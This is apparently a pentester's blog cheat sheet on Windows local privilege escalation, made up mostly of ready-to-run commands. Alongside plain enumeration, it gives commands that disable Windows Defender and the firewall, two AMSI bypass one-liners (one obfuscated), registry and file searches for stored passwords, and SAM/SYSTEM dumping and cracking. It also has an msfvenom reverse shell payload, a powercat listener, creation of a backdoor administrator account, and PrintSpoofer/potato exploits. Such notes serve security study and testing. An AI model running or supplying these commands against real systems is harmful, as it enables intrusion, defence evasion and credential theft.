---
title: Windows Local Escalation and Enumeration
published: 2025-02-8
description: ""
image: "./img/img.jpg"
tags: [Notes ,AD, windows]
category: 'Notes'
draft: false
---


# Local Escalation and Enumeration
## Local User & Group Enumeration

In Ps : 
```bash
$env:username
whoami /priv
whoami /groups
net user
whoami /all
Get-LocalUser | ft Name, Enabled, LastLogon
Get-ChildItem C:\Users -Force | select Name
net accounts
net user administrator
net localgroup
Get-LocalGroup | ft Name
net localgroup administrators
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
Get-LocalGroupMember Administrators
```

In CMD : 
```bash
echo %USERNAME% || whoami
whoami /priv
whoami /groups
net user
whoami /all
net accounts
net user administrator
net localgroup
net localgroup administrators
```

## Network Enumeration

```bash
# List all network interfaces, IP, and DNS.
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
# List current routing table
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
# List the ARP table
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
# List all current connections
netstat -ano
# List firewall state and current configuration
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
# List firewall's blocked ports
$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
# Disable firewall
netsh firewall set opmode disable
netsh advfirewall set allprofiles state off
# List all network shares
net share
SNMP Configuration
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```

## Antivirus & Detections

### Windows Defender
```bash
# check status of Defender
PS C:\> Get-MpComputerStatus

# disable Real Time Monitoring
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
PS C:\> Set-MpPreference -DisableIOAVProtection $true
```

### Firewall
```bash
netsh advfirewall show domain
netsh advfirewall show private
netsh advfirewall show public
```

### AppLocker Enumeration

- With the GPO
- HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2 (Keys: Appx, Dll, Exe, Msi and Script).
```bash
# List AppLocker rules
PS C:\> $a = Get-ApplockerPolicy -effective
PS C:\> $a.rulecollections
```

### Powershell

```bash
# Default powershell locations in a Windows system.
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell
# Example of AMSI Bypass.
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
```

### Default Writeable Folders

C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing

## Hunting Passwords

### SAM and SYSTEM files
The Security Account Manager (SAM), often Security Accounts Manager, is a database file. The user passwords are stored in a hashed format in a registry hive either as a LM hash or as a NTLM hash. This file can be found in 
`%SystemRoot%/system32/config/SAM` and is mounted on `HKLM/SAM`.

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Generate a hash file for John using pwdump or samdump2.
```bash
pwdump SYSTEM SAM > /root/sam.txt
samdump2 SYSTEM SAM -o sam.txt
```

Then crack it with `john -format=NT /root/sam.txt`.

### Search for file contents

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

### Search for a file with a certain filename

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
# cmd
where /R C:\ user.txt
where /R C:\ *.ini
```

### Search the registry for key names and passwords

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### Read a value of a certain sub key

```bash
REG QUERY "HKLM\Software\Microsoft\FTH" /V RuleList
```

### Passwords in unattend.xml

Location of the unattend.xml files.

```bash
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

Display the content of these files with dir `/s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul`

Example content

```bash
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

Unattend credentials are stored in base64 and can be decoded manually with base64.
```bash
$ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="  | base64 -d 
SecretSecurePassword1234*
```
The Metasploit module post/windows/gather/enum_unattend looks for these files.

### IIS Web config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

### Other files

```bash
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b
```

## PrivEsc Tools

- PowerUp
    - `import-module .\PowerUp.ps1`
    - `Invoke-AllChecks`
- Jaws
    - `import-module .\jaws-enum.ps1`
- WinPeas
    - `winpeas.bat`
- Watson
    - `watson.exe`
- CVE-2019-1388

```bash
# Run from CMD:
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt

# Bypassing the PowerShell Execution Policy
powershell -ep bypass

# AMSI stands for Anti-Malware Scan Interface and was introduced in Windows 10.AMSI provides increased protection against the usage of some modern Tools,
SET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

## Windows Version and Configuration

After getting All the Information u need, u can search for exploits

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

### Extract patchs and updates

```bash
wmic qfe
```

### Architecture

```bash
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
```

### List all env variables

```bash
set
Get-ChildItem Env: | ft Key,Value
```

### List all drives

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## Schedule Task Privilege Escalation

```bash
# Run from CMD:
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt

# Manually Search
schtasks /query /fo LIST 2>nul | findstr TaskName
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
schtasks /query /fo LIST /v > C:\Users\student1\Desktop\task.txt

# Edit the file executed by Administrator
net user /add rabakuku Password123
net localgroup administrators rabakuku /add

# reboot
shutdown /r /f
```

## Unquoted service path

```bash
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt

# From Kali or ParrotOS
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.55 LPORT=1234 -f exe > abyss.exe

# Run a web server
Python -m SimpleHTTPServer
```

powercat is a powershell function. First you need to load the function before you can execute it. You can put one of the below commands into your powershell profile so powercat is automatically loaded when powershell starts.

```bash
Import-module .\powercat.ps1
Powercat -l -p 1234 -Verbose

net localgroup administrators student1 /add
```

read more on: [@SumitVerma101](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae)

## SEImpersonate

- Download Print Spoofer
https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0

```bash
# Run Print Spoofer
PrintSpoofer.exe -d 1 -c cmd

# Disable Firewal and AV
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
netsh advfirewall set allprofiles state off
```

other exploit to test with seimpersonate
https://github.com/ohpe/juicy-potato
https://github.com/antonioCoco/RogueWinRM
https://github.com/CCob/SweetPotato
https://github.com/antonioCoco/RoguePotato

